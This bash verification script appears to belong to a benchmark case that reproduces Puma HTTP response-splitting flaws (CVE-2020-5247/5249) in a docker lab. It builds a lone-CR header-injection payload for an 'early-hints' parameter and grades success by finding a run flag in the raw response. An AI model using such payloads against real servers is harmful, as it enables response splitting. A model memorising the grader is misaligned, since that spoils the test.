#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
# 定制 for PCBV2-0017 (puma CVE-2020-5247 -> CVE-2020-5249, HTTP response splitting / CRLF)
#   --seed     : 常规响应头 sink  (?x=<CRLF payload>)  -> CVE-2020-5247 路径 (original_poc.py candidate)
#   --residual : early-hints sink (?eh=<CRLF payload>) -> CVE-2020-5249 路径（与 heldout bypass 同语义，
#                payload 相同(lone-CR split)、仅 sink 不同；在 v1(4.3.2) 上 early-hints lambda 未设防）
# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
CASE_DIR="${CASE_DIR:-$(cd "$(dirname "$0")/.." && pwd)}"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

# flag 通道: seed_exec.py 返回的 'raw' 字段 = 服务器原始响应字节；flag 由 PoC 嵌入 CRLF payload，
#            仅当 Puma 接受 split 诱导 header 值时才出现在响应字节中。
set -uo pipefail
JUDGE_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}"
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# 构造 candidate JSON（value 内嵌 per-run RUN_FLAG；seed_exec.py 只替换 __PCB_X__，故此处统一替换）
if [[ "$MODE" == "--seed" ]]; then
  "$PY" - "$CASE_DIR/poc" "$RUN_FLAG" > "$WORK_DIR/cand.json" <<'PY'
import sys, json
sys.path.insert(0, sys.argv[1])
import original_poc
flag = sys.argv[2]
cand = original_poc.candidate()
cand["value"] = cand["value"].replace("__PCB_FLAG__", flag).replace("__PCB_X__", flag)
print(json.dumps(cand))
PY
else
  # residual: early-hints sink（CVE-2020-5249）。与 seed 相同 lone-CR split payload，仅 sink/param 不同。
  "$PY" - "$RUN_FLAG" > "$WORK_DIR/cand.json" <<'PY'
import sys, json
flag = sys.argv[1]
print(json.dumps({
    "probe_id": "cve-2020-5249-early-hints-crlf",
    "sink": "early_hints",
    "param": "eh",
    "value": "pcbseed\rX-Pcb-Injected: " + flag,
}))
PY
fi

export PCB_X="$RUN_FLAG"   # seed_exec.py 占位符替换兜底（value 内 __PCB_X__ 亦生效）
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 600; echo

# 判定：raw 字段 = 服务器原始响应字节；判定基准 RUN_FLAG_REF（平台注入的真 flag，wrong/stale
# 检查时 RUN_FLAG=override 而 REF=真 flag -> 判定必须失败），手动运行回退 RUN_FLAG。
# probe 错误视为环境失败。
"$PY" - "$OUT" <<'PY'
import json, os, sys
s = sys.argv[1]
try:
    d = json.loads(s)
except Exception:
    print("verify: bad executor output", file=sys.stderr)
    sys.exit(20)
raw = d.get("raw") or ""
if raw.startswith("__PROBE_ERROR__"):
    print("verify: probe error (env):", raw[:200], file=sys.stderr)
    sys.exit(20)
ref = os.environ.get("RUN_FLAG_REF") or os.environ["RUN_FLAG"]
print("--- raw response (first 400 chars) ---")
print(raw[:400])
sys.exit(0 if ref in raw else 10)
PY
